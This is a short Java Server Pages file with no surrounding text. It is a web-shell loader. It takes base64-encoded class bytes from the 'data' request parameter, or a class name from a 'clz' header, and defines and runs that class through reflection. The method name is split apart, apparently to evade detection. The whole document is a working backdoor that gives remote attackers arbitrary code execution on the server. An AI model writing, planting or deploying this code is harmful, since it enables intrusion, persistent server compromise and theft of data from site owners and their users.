<%
    String data = request.getParameter("data");
    String clz = request.getHeader("clz");
    if(clz != null){
        Thread.currentThread().getContextClassLoader().loadClass(clz).getConstructor(new Class[]{HttpServletRequest.class, HttpServletResponse.class}).newInstance(request, response);
    }else if(data != null){
        byte[] bytes1 = new sun.misc.BASE64Decoder().decodeBuffer(data);
        java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod("define"+"Class", new Class[]{byte[].class, int.class, int.class});
        m.setAccessible(true);
        ((Class)m.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{bytes1, 0, bytes1.length})).getConstructor(new Class[]{HttpServletRequest.class, HttpServletResponse.class}).newInstance(request, response);
    }
%>